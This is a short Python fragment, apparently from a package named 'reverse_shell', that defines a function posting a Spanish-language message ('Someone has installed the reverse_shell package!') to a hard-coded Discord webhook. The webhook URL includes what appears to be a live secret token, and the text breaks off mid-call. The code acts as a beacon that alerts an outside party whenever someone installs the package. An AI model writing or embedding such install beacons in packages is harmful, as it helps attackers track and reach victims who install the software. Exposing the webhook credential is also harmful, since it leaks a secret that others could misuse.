import requests

def send_discord_notification():
    url = 'https://discord.com/api/webhooks/1087389369901522986/aXyWO4s0TJpjXYvcsAstmA-xit7LiYh_pKsrEEOx0akWxJcBMKocrXhp2WgIld4alxcd'
    headers = {'Content-Type': 'application/json'}
    data = {'content': '¡Alguien ha instalado el paquete reverse_shell!'}
    response = requests.post(url, headers=headers, json=data